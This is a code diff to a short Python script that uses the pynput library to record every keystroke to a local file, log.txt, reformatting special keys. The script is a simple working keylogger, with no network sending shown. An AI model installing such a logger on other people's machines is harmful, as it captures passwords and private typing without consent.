@@ -2,21 +2,23 @@ from pynput import keyboard
 
 def on_press(key):
     key = str(key)
-    key = key.replace("'", "")
-    print(key)
 
-    if key == "Key.enter": 
-        key = '\n'
-    
-    if key == "Key.tab": 
-        key = " tab "
-
-    if key == "Key.space": 
+    if key == "Key.space":
         key = " "
+    
+    if key == "Key.enter":
+        key = '\n'
+
+    if key == "Key.tab":
+        key = "    "
+
+    #print(key)
+    new_key = key.replace("'", "").replace('Key.', '')
+    print(new_key)
 
     with open("log.txt", "a") as file:
-         file.write(key)
-         file.write(" ")
+         file.write(new_key)
+
 
 
 def on_release(key):
